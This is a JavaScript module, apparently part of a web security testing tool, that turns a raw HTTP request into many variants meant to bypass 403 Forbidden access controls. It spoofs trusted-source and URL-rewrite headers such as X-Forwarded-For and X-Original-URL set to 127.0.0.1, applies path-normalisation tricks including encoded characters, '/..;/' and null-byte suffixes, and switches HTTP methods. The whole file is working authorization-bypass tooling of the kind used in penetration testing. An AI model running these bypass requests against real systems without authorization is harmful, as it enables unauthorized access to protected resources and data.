// Techniques commonly used by Burp "403 bypass" extensions. Each variant is a
// complete raw request that can be sent through eko's /api/repeater endpoint.

function parse(raw) {
  const s = String(raw || '').replace(/\r\n/g, '\n')
  const sep = s.indexOf('\n\n')
  const head = sep >= 0 ? s.slice(0, sep) : s
  const body = sep >= 0 ? s.slice(sep + 2) : ''
  const lines = head.split('\n')
  const requestLine = lines.shift() || ''
  return { requestLine, headers: lines.filter(Boolean), body }
}

function build(parsed) {
  return `${parsed.requestLine}\n${parsed.headers.join('\n')}\n\n${parsed.body}`
}

function urlFrom(requestLine) {
  const parts = requestLine.trim().split(/\s+/)
  return parts[1] || ''
}

function setURL(parsed, url) {
  const parts = parsed.requestLine.trim().split(/\s+/)
  if (parts.length < 2) return parsed
  parts[1] = url
  return { ...parsed, requestLine: parts.join(' ') }
}

function setMethod(parsed, method) {
  const parts = parsed.requestLine.trim().split(/\s+/)
  if (!parts.length) return parsed
  parts[0] = method
  return { ...parsed, requestLine: parts.join(' ') }
}

function withHeader(parsed, name, value) {
  const lower = name.toLowerCase() + ':'
  const headers = parsed.headers.filter((h) => !h.toLowerCase().startsWith(lower))
  headers.push(`${name}: ${value}`)
  return { ...parsed, headers }
}

function mapURL(parsed, fn) {
  try {
    const u = new URL(urlFrom(parsed.requestLine))
    fn(u, u.pathname)
    return setURL(parsed, u.toString())
  } catch {
    return null
  }
}

function firstEncoded(path) {
  return path.replace(/\/([A-Za-z])/, (_, c) => '/%' + c.charCodeAt(0).toString(16))
}

function firstDoubleEncoded(path) {
  return path.replace(/\/([A-Za-z])/, (_, c) => '/%25' + c.charCodeAt(0).toString(16))
}

export function buildBypassVariants(raw) {
  const base = parse(raw)
  const originalURL = urlFrom(base.requestLine)
  if (!originalURL) return []

  let u
  try {
    u = new URL(originalURL)
  } catch {
    return []
  }
  const path = u.pathname || '/'
  const pathQuery = path + u.search
  const origin = u.origin
  const originalMethod = (base.requestLine.trim().split(/\s+/)[0] || 'GET').toUpperCase()

  const out = []
  const seen = new Set()

  function add(name, group, parsed) {
    if (!parsed) return
    const body = build(parsed)
    if (seen.has(body)) return
    seen.add(body)
    out.push({ name, group, raw: body })
  }

  add('original request', 'baseline', base)

  // Header tricks: make a front-end/reverse proxy think the request is for an
  // allowed path or comes from a trusted address.
  const headerTricks = [
    ['X-Original-URL', pathQuery],
    ['X-Rewrite-URL', pathQuery],
    ['X-Forwarded-Host', '127.0.0.1'],
    ['X-Forwarded-Server', 'localhost'],
    ['X-Forwarded-Port', '443'],
    ['X-Real-IP', '127.0.0.1'],
    ['X-Client-IP', '127.0.0.1'],
    ['X-Remote-IP', '127.0.0.1'],
    ['X-Remote-Addr', '127.0.0.1'],
    ['X-Originating-IP', '127.0.0.1'],
    ['X-Custom-IP-Authorization', '127.0.0.1'],
    ['X-Original-Host', '127.0.0.1'],
    ['Referer', origin + '/'],
    ['X-HTTP-Method-Override', 'GET'],
    ['X-Method-Override', 'GET'],
    ['X-Original-Method', 'GET'],
  ]
  for (const [name, value] of headerTricks) add(name, 'header', withHeader(base, name, value))

  // Multiple spoofed source headers at once (some apps check any of them).
  let multi = base
  for (const [name, value] of [
    ['X-Forwarded-For', '127.0.0.1'],
    ['X-Real-IP', '127.0.0.1'],
    ['X-Custom-IP-Authorization', '127.0.0.1'],
  ]) {
    multi = withHeader(multi, name, value)
  }
  add('spoofed source headers', 'header', multi)

  // Path normalization / parser-differential tricks.
  const pathTricks = [
    ['trailing slash', (p) => p + '/'],
    ['trailing /.', (p) => p + '/.'],
    ['trailing /..;/', (p) => p + '/..;/'],
    ['trailing /;', (p) => p + '/;'],
    ['trailing //', (p) => p + '//'],
    ['leading /.', (p) => '/.' + p],
    ['leading //', (p) => '//' + p],
    ['double slashes', (p) => p.replace(/\//g, '//')],
    ['encoded first char', firstEncoded],
    ['double-encoded first char', firstDoubleEncoded],
    ['encoded leading slash', (p) => '/%2f' + p.replace(/^\//, '')],
    ['uppercase path', (p) => p.toUpperCase()],
    ['lowercase path', (p) => p.toLowerCase()],
    ['.json suffix', (p) => p + '.json'],
    ['.html suffix', (p) => p + '.html'],
    ['wildcard suffix', (p) => p + '/*'],
    ['null byte suffix', (p) => p + '%00'],
    ['dot-dot segment', (p) => p + '/%2e%2e'],
  ]
  for (const [name, fn] of pathTricks) add(name, 'path', mapURL(base, (x, p) => { x.pathname = fn(p) }))

  // Raw URL-string tricks that the URL class would normalize away.
  add('query only', 'path', setURL(base, originalURL + '?'))
  add('hash only', 'path', setURL(base, originalURL + '#'))

  // Method overrides at the request line.
  const methods = ['GET', 'POST', 'PUT', 'PATCH', 'HEAD', 'OPTIONS', 'TRACE']
  for (const m of methods) {
    if (m === originalMethod) continue
    add(m + ' method', 'method', setMethod(base, m))
  }

  return out
}
